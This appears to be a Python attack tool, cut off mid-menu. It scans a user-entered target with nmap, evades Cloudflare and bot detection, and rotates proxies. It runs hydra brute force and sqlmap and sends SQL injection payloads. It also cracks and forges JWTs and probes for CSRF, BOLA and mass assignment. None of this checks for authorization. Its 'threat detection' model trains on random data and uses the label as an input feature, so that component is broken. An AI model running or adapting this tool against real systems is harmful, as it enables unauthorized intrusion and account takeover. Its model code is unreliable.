import re
import json
import random
import logging
import subprocess
import time
import requests
import jwt
import pandas as pd
import numpy as np
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup
import socket
import ipaddress
import cloudscraper
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from sklearn.preprocessing import StandardScaler, LabelEncoder
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import accuracy_score


logging.basicConfig(filename='scanner.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')



def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_ports(ports):
    valid_ports = []
    for port in ports:
        try:
            p = int(port)
            if 0 < p < 65536:
                valid_ports.append(p)
        except ValueError:
            continue
    return valid_ports

def get_target():
    target = input(f"{Fore.CYAN}Enter target (URL/IP): {Style.RESET_ALL}").strip()
    

    if validate_ip(target):
        return f"http://{target}", target
    
    if target.startswith(('http://', 'https://')):
        try:
            domain = target.split('//')[1].split('/')[0]
            target_ip = socket.gethostbyname(domain)
            return target, target_ip
        except socket.gaierror:
            print(f"{Fore.RED}Could not resolve domain!{Style.RESET_ALL}")
            exit(1)
    

    try:
        test_url = f"https://{target}"
        domain = target.split('/')[0]
        target_ip = socket.gethostbyname(domain)
        return test_url, target_ip
    except (socket.gaierror, requests.exceptions.SSLError):
        try:
            test_url = f"http://{target}"
            domain = target.split('/')[0]
            target_ip = socket.gethostbyname(domain)
            return test_url, target_ip
        except socket.gaierror:
            print(f"{Fore.RED}Could not resolve domain!{Style.RESET_ALL}")
            exit(1)


try:
    target_url, target_ip = get_target()
    print(f"\nTarget URL: {Fore.GREEN}{target_url}{Style.RESET_ALL}")
    print(f"Resolved IP: {Fore.BLUE}{target_ip}{Style.RESET_ALL}")
except KeyboardInterrupt:
    print(f"\n{Fore.YELLOW}Operation cancelled by user{Style.RESET_ALL}")
    exit(0)

import glob
import os

def get_latest_file(pattern):
    files = glob.glob(os.path.join('threat_data', pattern))
    if not files:
        raise FileNotFoundError(f"No files found matching pattern: {pattern}")
    return max(files, key=os.path.getctime)

def train_model():
    try:
        latest_file = get_latest_file('traffic_data_*.csv')
        data = pd.read_csv(latest_file)
        
        X = data[['bytes', 'is_malicious']]  
        y = data['is_malicious']  
        
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
        
        model = RandomForestClassifier()
        model.fit(X_train, y_train)
        
        y_pred = model.predict(X_test)
        accuracy = accuracy_score(y_test, y_pred)
        print(f"Model trained with accuracy: {accuracy:.2f}")
        return model
    except Exception as e:
        print(f"Error in train_model: {e}")
        return None

init(autoreset=True)
banner = f"""
{Fore.RED}

 ██ ▄█▀ ██▓▓██   ██▓ ▄▄▄         ▓█████  ███▄    █  ▄▄▄██▀▀▀ ██▓ ██▓        ██▓███   ▒█████   █     █░▓█████  ██▀███  
 ██▄█▒ ▓██▒ ▒██  ██▒▒████▄       ▓█   ▀  ██ ▀█   █    ▒██   ▓██▒▓██▒       ▓██░  ██▒▒██▒  ██▒▓█░ █ ░█░▓█   ▀ ▓██ ▒ ██▒
▓███▄░ ▒██▒  ▒██ ██░▒██  ▀█▄     ▒███   ▓██  ▀█ ██▒   ░██   ▒██▒▒██░       ▓██░ ██▓▒▒██░  ██▒▒█░ █ ░█ ▒███   ▓██ ░▄█ ▒
▓██ █▄ ░██░  ░ ▐██▓░░██▄▄▄▄██    ▒▓█  ▄ ▓██▒  ▐▌██▒▓██▄██▓  ░██░▒██░       ▒██▄█▓▒ ▒▒██   ██░░█░ █ ░█ ▒▓█  ▄ ▒██▀▀█▄  
▒██▒ █▄░██░  ░ ██▒▓░ ▓█   ▓██▒   ░▒████▒▒██░   ▓██░ ▓███▒   ░██░░██████▒   ▒██▒ ░  ░░ ████▓▒░░░██▒██▓ ░▒████▒░██▓ ▒██▒
▒ ▒▒ ▓▒░▓     ██▒▒▒  ▒▒   ▓▒█░   ░░ ▒░ ░░ ▒░   ▒ ▒  ▒▓▒▒░   ░▓  ░ ▒░▓  ░   ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▓░▒ ▒  ░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒ ▒░ ▒ ░ ▓██ ░▒░   ▒   ▒▒ ░    ░ ░  ░░ ░░   ░ ▒░ ▒ ░▒░    ▒ ░░ ░ ▒  ░   ░▒ ░       ░ ▒ ▒░   ▒ ░ ░   ░ ░  ░  ░▒ ░ ▒░
░ ░░ ░  ▒ ░ ▒ ▒ ░░    ░   ▒         ░      ░   ░ ░  ░ ░ ░    ▒ ░  ░ ░      ░░       ░ ░ ░ ▒    ░   ░     ░     ░░   ░ 
░  ░    ░   ░ ░           ░  ░      ░  ░         ░  ░   ░    ░      ░  ░                ░ ░      ░       ░  ░   ░     
            ░ ░                                                                                                       


{Style.RESET_ALL}
"""

class AdvancedWebScraper:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper()
        self.driver = None
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
    
    def bypass_cloudflare(self, url, timeout=30):

        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.5',
            }
            response = self.scraper.get(url, headers=headers, timeout=timeout)
            
            if 'cf-chl-bypass' in response.text or 'Cloudflare' in response.text:
                return self._use_selenium(url)
            return response
        except Exception as e:
            print(f"Cloudflare bypass failed: {e}")
            return None
    
    def _use_selenium(self, url):
        try:
            options = Options()
            options.add_argument("--headless")
            options.add_argument(f"user-agent={random.choice(self.user_agents)}")
            options.add_argument("--disable-blink-features=AutomationControlled")
            
            self.driver = webdriver.Chrome(options=options)
            self.driver.get(url)
            

            time.sleep(10)
            

            cookies = self.driver.get_cookies()
            session = requests.Session()
            for cookie in cookies:
                session.cookies.set(cookie['name'], cookie['value'])
            
            return session.get(url)
        except Exception as e:
            print(f"Selenium bypass failed: {e}")
            return None
        finally:
            if self.driver:
                self.driver.quit()

    

class ThreatDataCollector:
    def __init__(self):
        self.data_dir = "threat_data"
        os.makedirs(self.data_dir, exist_ok=True)
        
    def fetch_latest_cves(self, days=7):
        end_date = datetime.now()
        start_date = end_date - timedelta(days=days)
        
        url = f"https://services.nvd.nist.gov/rest/json/cves/1.0"
        params = {
            'pubStartDate': start_date.strftime('%Y-%m-%dT%H:%M:%S:000 UTC'),
            'pubEndDate': end_date.strftime('%Y-%m-%dT%H:%M:%S:000 UTC')
        }
        
        try:
            response = requests.get(url, params=params, timeout=30)
            data = response.json()
            return pd.DataFrame([
                {
                    'cve_id': item['cve']['CVE_data_meta']['ID'],
                    'severity': item['impact'].get('baseMetricV3', {}).get('cvssV3', {}).get('baseSeverity', 'UNKNOWN'),
                    'description': item['cve']['description']['description_data'][0]['value'],
                    'published_date': item['publishedDate'],
                    'last_modified': item['lastModifiedDate']
                }
                for item in data['result']['CVE_Items']
            ])
        except Exception as e:
            print(f"Error fetching CVEs: {e}")
            return pd.DataFrame()

    def fetch_malware_traffic(self):
        return pd.DataFrame({
            'src_ip': ['192.168.1.' + str(i) for i in range(1, 101)],
            'dst_ip': ['10.0.0.' + str(i) for i in range(1, 101)],
            'bytes': np.random.randint(100, 10000, 100),
            'is_malicious': np.random.choice([0, 1], 100, p=[0.7, 0.3])
        })

    def update_dataset(self):
        cve_data = self.fetch_latest_cves()
        traffic_data = self.fetch_malware_traffic()
        
        if not cve_data.empty:
            cve_data.to_csv(f"{self.data_dir}/cve_data_{datetime.now().strftime('%Y%m%d')}.csv", index=False)
        
        if not traffic_data.empty:
            traffic_data.to_csv(f"{self.data_dir}/traffic_data_{datetime.now().strftime('%Y%m%d')}.csv", index=False)
        
        return cve_data, traffic_data



class ThreatDataProcessor:
    def __init__(self):
        self.scaler = StandardScaler()
        self.encoder = LabelEncoder()
        
    def load_and_preprocess(self):
        cve_files = [f for f in os.listdir('threat_data') if f.startswith('cve_data')]
        cve_df = pd.concat([pd.read_csv(f"threat_data/{f}") for f in cve_files])
        
        traffic_files = [f for f in os.listdir('threat_data') if f.startswith('traffic_data')]
        traffic_df = pd.concat([pd.read_csv(f"threat_data/{f}") for f in traffic_files])
        
        cve_features = self._process_cve_data(cve_df)
        traffic_features = self._process_traffic_data(traffic_df)
        
        combined_df = pd.merge(cve_features, traffic_features, how='outer')
        return combined_df.dropna()

    def _process_cve_data(self, df):
        df['severity_score'] = df['severity'].map({
            'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1
        }).fillna(0)
        
        return df[['severity_score', 'published_date']]

    def _process_traffic_data(self, df):
        df['traffic_risk'] = df['is_malicious'] * df['bytes'] / 1000
        return df[['traffic_risk']]


class ThreatDetectionModel:
    def __init__(self):
        self.model = None

    def load_model(self):
        try:
            self.model = train_model()
            if self.model is None:
                raise ValueError("Model training failed")
            logging.info("Model loaded successfully")
            return True
        except Exception as e:
            logging.error(f"Error loading model: {e}")
            return False

    def predict(self, data):
        if self.model is None:
            raise ValueError("Model not loaded")
        return self.model.predict(data)

    def predict_proba(self, data):
        if self.model is None:
            raise ValueError("Model not loaded")
        return self.model.predict_proba(data)


class RealTimeThreatAnalyzer:
    def __init__(self):
        self.model = ThreatDetectionModel()
        self.scaler = StandardScaler()  # Add scaler for feature normalization
        if not self.model.load_model():
            raise RuntimeError("Failed to initialize threat detection model")

    def analyze_network_traffic(self, traffic_data):
        try:
            live_df = pd.DataFrame([traffic_data])

            required_columns = ['bytes', 'is_malicious']
            if not all(col in live_df.columns for col in required_columns):
                raise ValueError(f"Input data must contain {required_columns}")

            processor = ThreatDataProcessor()
            processed_data = processor._process_traffic_data(live_df)

            prediction = self.model.predict(processed_data)
            probability = self.model.predict_proba(processed_data)[:, 1]

            return {
                'is_threat': bool(prediction[0]),
                'threat_probability': float(probability[0]),
                'timestamp': datetime.now().isoformat()
            }

        except ValueError as ve:
            logging.error(f"Input validation error: {str(ve)}")
            return None
        except AttributeError as ae:
            logging.error(f"Model prediction error: {str(ae)}")
            return None
        except Exception as e:
            logging.error(f"Error in traffic analysis: {str(e)}")
            return None


def get_random_proxy():
    if not PROXY_LIST:
        return None
    proxy = random.choice(PROXY_LIST)
    return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}


def advanced_request(url, retries=3):
    techniques = [
        {'method': 'cloudflare_bypass'},
        {'method': 'selenium'},
        {'method': 'proxy_rotation'},
        {'method': 'slow_request'}
    ]

    for attempt in range(retries):
        tech = techniques[attempt % len(techniques)]
        try:
            if tech['method'] == 'cloudflare_bypass':
                scraper = AdvancedWebScraper()
                response = scraper.bypass_cloudflare(url)
            elif tech['method'] == 'selenium':
                response = AdvancedWebScraper()._use_selenium(url)
            elif tech['method'] == 'proxy_rotation':
                response = requests.get(url, proxies=get_random_proxy())
            else:
                time.sleep(random.uniform(1, 3))
                response = requests.get(url)

            if response and response.status_code == 200:
                return response
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")

    return None

def load_proxies(filename='proxies.txt'):
    with open(filename, 'r') as f:
        return [line.strip() for line in f if line.strip()]

PROXY_LIST = load_proxies()

def get_new_proxy():
    return random.choice(PROXY_LIST)

def get_proxy_session():
    session = requests.Session()
    proxy = get_new_proxy()
    print(f"Using proxy {proxy}")

    session.proxies = {
        "http" : proxy,
        "https" : proxy
    }

    return session

def main():
    with get_proxy_session() as sess:
        response = sess.get('https://api.ipify.org')
        print('Current IP with Proxy:', response.text)

def predict_vulnerabilities(model, features):
    pred = model.predict(pd.DataFrame([features]))
    return pred[0]

def scan_with_nmap(target_ip, options=None, timeout=60):
    if not validate_ip(target_ip):
        logging.error(f"Invalid IP address: {target_ip}")
        raise ValueError("Invalid IP address")

    logging.info(f"Starting nmap scan on {target_ip}")
    cmd = ['nmap', '-sV', '-T4', '-oX', '-']
    if options:
        cmd.extend(options)
    cmd.append(target_ip)

    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=True)
        xml_output = result.stdout.decode()
        root = ET.fromstring(xml_output)

        scan_data = []
        for host in root.findall('host'):
            for port in host.findall('./ports/port'):
                port_id = int(port.get('portid'))
                protocol = port.get('protocol')
                state = port.find('state').get('state')
                service = port.find('service').get('name') if port.find('service') is not None else 'unknown'

                scan_data.append({
                    'port': port_id,
                    'protocol': protocol,
                    'state': state,
                    'service': service
                })

        logging.info(f"Scan finished on {target_ip} with {len(scan_data)} ports found.")
        return scan_data

    except subprocess.TimeoutExpired:
        logging.warning(f"Nmap scan timed out on {target_ip}")
        return None
    except subprocess.CalledProcessError as e:
        logging.error(f"Nmap scan failed: {e}")
        return None
    except ET.ParseError:
        logging.error("Failed to parse nmap XML output.")
        return None



def fetch_cves(service_name):
    url = f"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword={service_name}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            cves = [item['cve']['CVE_data_meta']['ID'] for item in data.get('result', {}).get('CVE_Items', [])]
            return cves[:5] 
    except Exception as e:
        logging.error(f"Failed to fetch CVEs for {service_name}: {e}")
    return []


VULNERABILITY_DB = {
    "http": {
        "vulnerability": "SQL Injection",
        "tool": "sqlmap",
        "exploit_command": "sqlmap -u http://{ip}/ --batch --dbs"
    },
    "ssh": {
        "vulnerability": "Weak password / brute force",
        "tool": "hydra",
        "exploit_command": "hydra -l root -P passwords.txt ssh://{ip}"
    },
}


def suggest_attacks(ip, services):
    suggestions = []

    for service in services:
        s = service.lower()
        if s in VULNERABILITY_DB:
            cves = fetch_cves(s)
            vuln = VULNERABILITY_DB[s]
            suggestions.append({
                "service": s,
                "vulnerability": vuln["vulnerability"],
                "cve": cves,
                "tool": vuln["tool"],
                "exploit_command": vuln["exploit_command"].format(ip=ip)
            })
        else:
            suggestions.append({
                "service": s,
                "vulnerability": "Unknown or no common exploits found",
                "cve": [],
                "tool": None,
                "exploit_command": None
            })

    return json.dumps(suggestions, indent=4)


def run_exploit(command_list, timeout=120):
    if not isinstance(command_list, list):
        logging.error("Exploit command should be a list of command parts.")
        raise ValueError("Command must be list of args")

    logging.info(f"Running exploit: {' '.join(command_list)}")
    try:
        result = subprocess.run(command_list, capture_output=True, text=True, timeout=timeout)
        logging.info(f"Exploit finished with return code {result.returncode}")
        return {
            "command": command_list,
            "success": result.returncode == 0,
            "output": result.stdout.strip(),
            "error": result.stderr.strip()
        }
    except subprocess.TimeoutExpired:
        logging.warning(f"Exploit timed out: {' '.join(command_list)}")
        return {
            "command": command_list,
            "success": False,
            "output": "",
            "error": "TimeoutExpired"
        }


def generate_report(ip, attacks, results, directory="reports"):
    os.makedirs(directory, exist_ok=True)

    safe_ip = re.sub(r'[^a-zA-Z0-9\-_.]', '_', ip)
    filename = os.path.join(directory, f"report_{safe_ip}.json")

    report = {
        "date": datetime.now().isoformat(),
        "target": ip,
        "attacks": attacks,
        "results": results
    }

    try:
        with open(filename, "w") as f:
            json.dump(report, f, indent=4)
        logging.info(f"Report saved to {filename}")
    except IOError as e:
        logging.error(f"Failed to save report: {e}")



def check_endpoints(ip, paths):
    valid = []
    for path in paths:
        try:
            if requests.get(f"http://{ip}/{path.split('=')[0]}", timeout=3).status_code == 200:
                valid.append(path)
        except:
            continue
    return valid




def test_sqli_on_paths(ip, paths, timeout=5):
    vulnerable_urls = []
    
    for path in paths:
        if '=' not in path:
            continue
            
        bool_payload = "' OR '1'='1'--"
        bool_url = f"http://{ip}/{path}{bool_payload}"
        
        time_payload = "' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000))--"
        
        try:
            normal_response = requests.get(f"http://{ip}/{path}1", timeout=timeout)
            attack_response = requests.get(bool_url, timeout=timeout)
            
            if attack_response.status_code == 200 and \
               len(attack_response.content) != len(normal_response.content):
                vulnerable_urls.append(bool_url)
                continue
                
            start_time = time.time()
            requests.get(f"http://{ip}/{path}{time_payload}", timeout=timeout)
            elapsed = time.time() - start_time
            
            if elapsed > 3:  
                vulnerable_urls.append(f"http://{ip}/{path} (time-based)")
                
        except requests.RequestException:
            continue
            
    return vulnerable_urls


def test_post_sqli(ip, endpoints):
    vulnerable = []
    for endpoint in endpoints:
        url = f"http://{ip}/{endpoint}"
        payload = {"username": "admin'--", "password": "anything"}
        
        try:
            response = requests.post(url, data=payload, timeout=5)
            if "welcome admin" in response.text.lower():
                vulnerable.append(url)
        except:
            continue
            
    return vulnerable



class CSRFTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml'
        })
        self.csrf_tokens = []
        self.vulnerable_endpoints = []

    def detect_csrf_tokens(self, url):
        try:
            response = self.session.get(url, timeout=10, allow_redirects=False)
            if response.status_code != 200:
                return False

            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                inputs = form.find_all('input', {
                    'name': re.compile(r'(csrf|token|authenticity|_token)', re.I)
                })
                self.csrf_tokens.extend([
                    (inp.get('name'), inp.get('value')) 
                    for inp in inputs if inp.get('value')
                ])
            
            return bool(self.csrf_tokens)
            
        except Exception as e:
            logging.error(f"Error detecting CSRF tokens: {str(e)}")
            return False

    def test_csrf_protection(self, url, method='POST'):
        try:
            test_response = self.session.get(url, allow_redirects=False)
            if test_response.status_code != 200:
                return False

            malicious_data = {
                'username': 'attacker_csrf',
                'password': 'P@ssw0rd_CSRF_123',
                'email': 'attacker@example.com'
            }
            
            headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': url
            }
            
            if method.upper() == 'POST':
                response = self.session.post(url, data=malicious_data, headers=headers)
            else:
                response = self.session.get(url, params=malicious_data, headers=headers)

            if response.status_code in [200, 201, 302]:
                if not self.detect_csrf_tokens(url):
                    self.vulnerable_endpoints.append({
                        'url': url,
                        'method': method,
                        'status': 'VULNERABLE',
                        'evidence': response.text[:200] + "..." if response.text else None
                    })
                    return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error testing CSRF protection: {str(e)}")
            return False


class JWTTester:
    def __init__(self):
        self.common_secrets = [
            'secret', 'password', '123456', 'qwerty', 'admin',
            'supersecret', 'jwtsecret', 'changeme', 'masterkey',
            'tokenkey', 'jwtkey', 'sessionkey', 'default',
            'privatekey', 'publickey', 'jwtsecretkey'
        ]
        self.weak_algorithms = ['none', 'HS256', 'HS384', 'HS512']
        self.timeout = 5

    def test_jwt(self, token):

        try:
            try:
                decoded = jwt.decode(token, options={"verify_signature": False}, algorithms=["HS256"])
                logging.info(f"Token decoded (unverified): {decoded}")
            except Exception as e:
                logging.error(f"Token decode failed: {str(e)}")
                return False, "Invalid JWT format"

            try:
                jwt.decode(token, algorithms=["none"], options={"verify_signature": False})
                logging.critical("Accepts 'none' algorithm!")
                return True, "Critical: Accepts 'none' algorithm"
            except jwt.InvalidTokenError:
                pass

            for secret in self.common_secrets:
                for algo in self.weak_algorithms:
                    try:
                        start_time = time.time()
                        jwt.decode(token, key=secret, algorithms=[algo],
                                   options={"verify_signature": True},
                                   leeway=30)
                        logging.critical(f"Weak secret found: {secret} with algo {algo}")
                        return True, f"Critical: Weak secret '{secret}' with algo {algo}"
                    except (jwt.InvalidTokenError, jwt.DecodeError):
                        if time.time() - start_time > self.timeout:
                            logging.warning("JWT testing timed out")
                            return False, "Testing timeout"
                        continue

            try:
                payload = jwt.decode(token, options={"verify_signature": False})
                if 'exp' in payload:
                    exp = datetime.fromtimestamp(payload['exp'])
                    if exp < datetime.now():
                        logging.warning("Token is expired but might still be accepted")
                        return True, "Warning: Expired token"
            except Exception:
                pass

            return False, "No obvious vulnerabilities found"

        except Exception as e:
            logging.error(f"JWT test error: {str(e)}", exc_info=True)
            return False, f"Testing error: {str(e)}"

    def generate_malicious_jwt(self, original_token, payload_changes):
        try:
            header = jwt.get_unverified_header(original_token)
            payload = jwt.decode(original_token, options={"verify_signature": False})
            
         
            payload.update(payload_changes)
            
 
            if header.get('alg', '').upper() == 'NONE':
                return jwt.encode(payload, key='', algorithm='none')
                

            return jwt.encode(
                payload,
                key='malicious_key_123',  
                algorithm=header.get('alg', 'HS256')
            )
            
        except Exception as e:
            logging.error(f"Error generating malicious JWT: {str(e)}")
            return None





class APITester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        })
        self.vulnerabilities = []

    def test_broken_object_level_acl(self, endpoint, obj_id):
        url = f"{self.base_url}/{endpoint.strip('/')}/{obj_id}"
        
        try:
            response = self.session.get(url)
            
            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'BOLA',
                    'endpoint': url,
                    'severity': 'High',
                    'description': 'Broken Object Level Authorization',
                    'evidence': response.text[:200] + "..." if response.text else None
                })
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error testing BOLA: {str(e)}")
            return False

    def test_excessive_data_exposure(self, endpoint):
        url = f"{self.base_url}/{endpoint.strip('/')}"
        
        try:
            response = self.session.get(url)
            if response.status_code != 200:
                return False

            data = response.json()
            sensitive_fields = [
                'password', 'token', 'credit_card', 'ssn', 'dob',
                'api_key', 'secret', 'private_key', 'auth_token'
            ]
            exposed = []
            
            def check_fields(obj, path=''):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        current_path = f"{path}.{k}" if path else k
                        if any(f.lower() in current_path.lower() for f in sensitive_fields):
                            exposed.append(current_path)
                        check_fields(v, current_path)
                elif isinstance(obj, list):
                    for i, item in enumerate(obj):
                        check_fields(item, f"{path}[{i}]")
            
            check_fields(data)
            
            if exposed:
                self.vulnerabilities.append({
                    'type': 'Excessive Data Exposure',
                    'endpoint': url,
                    'severity': 'Medium',
                    'description': f'Exposed sensitive fields: {", ".join(exposed)}',
                    'evidence': str(exposed)[:200] + "..."
                })
                return True
                
            return False
            
        except Exception as e:
            logging.error(f"Error testing data exposure: {str(e)}")
            return False

    def test_mass_assignment(self, endpoint):
        url = f"{self.base_url}/{endpoint.strip('/')}"
        
        try:
            payload = {
                'username': 'testuser_' + str(random.randint(1000, 9999)),
                'password': 'Test@1234',
                'is_admin': True,
                'role': 'administrator',
                'privileges': ['read', 'write', 'delete']
            }
            
            response = self.session.post(url, json=payload)
            
            if response.status_code in [200, 201]:
                response_data = response.json()
                privileged_fields = ['is_admin', 'role', 'privileges']
                
                for field in privileged_fields:
                    if field in response_data and response_data[field] == payload[field]:
                        self.vulnerabilities.append({
                            'type': 'Mass Assignment',
                            'endpoint': url,
                            'severity': 'High',
                            'description': f'Able to set privileged field: {field}',
                            'evidence': str(response_data.get(field))[:200] + "..."
                        })
                        return True
                    
            return False
            
        except Exception as e:
            logging.error(f"Error testing mass assignment: {str(e)}")
            return False


class CookieAnalyzer:
    def __init__(self):
        self.session = requests.Session()
        self.cookie_flags = [
            'Secure', 'HttpOnly', 'SameSite', 
            'Path', 'Domain', 'Expires', 'Max-Age'
        ]

    def analyze_cookies(self, url):
        try:
            response = self.session.get(url, timeout=10)
            cookies = response.cookies
            
            results = []
            security_issues = []
            
            for cookie in cookies:
                cookie_data = {
                    'name': cookie.name,
                    'value': '*****' if len(cookie.value) > 10 else cookie.value,
                    'secure': cookie.secure,
                    'httponly': 'HttpOnly' in cookie._rest,
                    'samesite': getattr(cookie, 'samesite', None),
                    'domain': cookie.domain,
                    'path': cookie.path,
                    'expires': cookie.expires
                }
                
                results.append(cookie_data)
                

                issues = []
                if not cookie_data['secure']:
                    issues.append("Missing Secure flag (can be sent over HTTP)")
                if not cookie_data['httponly']:
                    issues.append("Missing HttpOnly flag (accessible via JavaScript)")
                if cookie_data['samesite'] not in ['Strict', 'Lax']:
                    issues.append("Weak SameSite policy (CSRF protection)")
                if cookie_data['domain'] and cookie_data['domain'].startswith('.'):
                    issues.append("Broad domain scope (security risk)")
                
                if issues:
                    security_issues.append({
                        'cookie_name': cookie.name,
                        'issues': issues,
                        'severity': 'High' if 'Secure' in issues or 'HttpOnly' in issues else 'Medium'
                    })
            
            return {
                'cookies': results,
                'security_issues': security_issues,
                'headers': dict(response.headers)
            }
            
        except Exception as e:
            logging.error(f"Error analyzing cookies: {str(e)}")
            return {
                'error': str(e),
                'cookies': [],
                'security_issues': []
            }


def run_hydra_attack(target_ip, port, service, username_list='usernames.txt', password_list='passwords.txt'):
    try:
        cmd = [
            'hydra',
            '-L', username_list,
            '-P', password_list,
            '-f',
            '-o', f'hydra_results_{target_ip}.txt',
            '-u',
            f'{service}://{target_ip}:{port}'
        ]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return {
            'success': 'successfully completed' in result.stdout.lower(),
            'output': result.stdout
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}


def run_sqlmap_scan(target_url, proxy=None):
    try:
        result = subprocess.run(
            ["sqlmap", "-u", target_url, "--batch"],
            capture_output=True, text=True
        )
        return {
            'success': 'sqlmap identified the following injection point' in result.stdout,
            'output': result.stdout
        }
    except Exception as e:
        return {
            'success': False,
            'error': str(e)
        }



class RealTimeThreatAnalyzer:
    def __init__(self, model):
        self.model = model
        self.scaler = StandardScaler()
        self._initialize_scaler()
        
    def _initialize_scaler(self):
        try:
            latest_file = max(glob.glob('threat_data/traffic_data_*.csv'), 
                            key=os.path.getctime)
            train_data = pd.read_csv(latest_file)
            X_train = train_data[['bytes', 'is_malicious']]
            self.scaler.fit(X_train)  
        except Exception as e:
            print(f"Scaler init error: {e}")
            self.scaler = None

    def analyze_network_traffic(self, traffic_data):
        try:
            traffic_df = pd.DataFrame([traffic_data])
            
  
            features = traffic_df[['bytes', 'is_malicious']]
            
            if self.scaler:
                scaled_features = self.scaler.transform(features)  
            else:
                scaled_features = features  
                print("Warning: Using unscaled features")

            prediction = self.model.predict(scaled_features)
            probability = self.model.predict_proba(scaled_features)[:,1]
            
            return {
                'is_threat': bool(prediction[0]),
                'threat_probability': float(probability[0]),
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            print(f"Analysis error: {e}")
            return None




if __name__ == "__main__":
    try:
        print(banner)

        model = train_model()
        if model is None:
            raise RuntimeError("Failed to train model")
        
        analyzer = RealTimeThreatAnalyzer(model)
        
        target_url, target_ip = get_target()
        print(f"\nTarget URL: {Fore.GREEN}{target_url}{Style.RESET_ALL}")
        print(f"Resolved IP: {Fore.BLUE}{target_ip}{Style.RESET_ALL}")

        # بررسی دسترسی به هدف
        def is_target_reachable(ip):
            try:
                socket.create_connection((ip, 80), timeout=5)
                return True
            except (socket.timeout, socket.gaierror):
                print(f"{Fore.RED}Target {ip} is unreachable or blocked{Style.RESET_ALL}")
                return False

        print(f"\n{Fore.CYAN}=== Port Discovery Method ==={Style.RESET_ALL}")
        print("1. Automatic port scan with Nmap")
        print("2. Manual port input")
        
        port_choice = input(f"{Fore.YELLOW}Select port discovery method (1-2): {Style.RESET_ALL}").strip()
        
        open_ports = []
        services = []
        
        if port_choice == "1":
            if not is_target_reachable(target_ip):
                print(f"{Fore.YELLOW}Switching to manual port entry due to unreachable target{Style.RESET_ALL}")
                port_choice = "2"
            else:
                print(f"{Fore.CYAN}\nRunning Nmap scan to discover open ports...{Style.RESET_ALL}")
                open_ports_data = scan_with_nmap(target_ip, timeout=120)
                
                if not open_ports_data:
                    print(f"{Fore.RED}Nmap scan failed or no open ports found!{Style.RESET_ALL}")
                    retry = input(f"{Fore.YELLOW}Retry scan (r) or enter ports manually (m)? [r/m]: {Style.RESET_ALL}").strip().lower()
                    if retry == 'r':
                        open_ports_data = scan_with_nmap(target_ip, timeout=120)
                    else:
                        port_choice = "2"
                
                if open_ports_data:
                    open_ports = [str(item['port']) for item in open_ports_data]
                    services = [item['service'] for item in open_ports_data]
                    
                    print(f"{Fore.GREEN}Found {len(open_ports)} open ports: {', '.join(open_ports)}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}Services detected: {', '.join(set(services))}{Style.RESET_ALL}")
                
        if port_choice == "2":
            while not open_ports:
                ports_input = input("Enter open ports (comma-separated, e.g., 80,443,22) or press Enter to skip: ").strip()
                if not ports_input:
                    print(f"{Fore.YELLOW}No ports entered. Exiting.{Style.RESET_ALL}")
                    exit(1)
                open_ports = validate_ports([p.strip() for p in ports_input.split(",")])
                if not open_ports:
                    print(f"{Fore.RED}Invalid ports entered. Please try again.{Style.RESET_ALL}")
                
            services = []
            for port in open_ports:
                port_int = int(port)
                if port_int in [80, 443]:
                    services.append("http")
                elif port_int == 22:
                    services.append("ssh")
                elif port_int == 21:
                    services.append("ftp")
                elif port_int == 25:
                    services.append("smtp")
                elif port_int == 53:
                    services.append("dns")
                else:
                    services.append("unknown")
            
            print(f"{Fore.GREEN}Using manually entered ports: {', '.join(map(str, open_ports))}{Style.RESET_ALL}")
            
        if not open_ports:
            print(f"{Fore.RED}No valid ports available! Exiting.{Style.RESET_ALL}")
            exit(1)

        while True:
            print(f"\n{Fore.CYAN}=== Main Menu ==={Style.RESET_ALL}")
            print("1. Run SQL Injection Test")
            print("2. Run CSRF Test")
            print("3. Run JWT Test")
            print("4. Run API Security Test")
            print("5. Analyze Cookies")
            print("6. Real-time Threat Analysis")
            print("7. Suggest Attack Vectors")
            print("8. Run Full Scan (All Tests)")
            print("9. Rescan Ports")
            print("10. Exit")
            
            choice = input(f"{Fore.YELLOW}Select an option (1-10): {Style.RESET_ALL}").strip()
            
            if choice == "1":
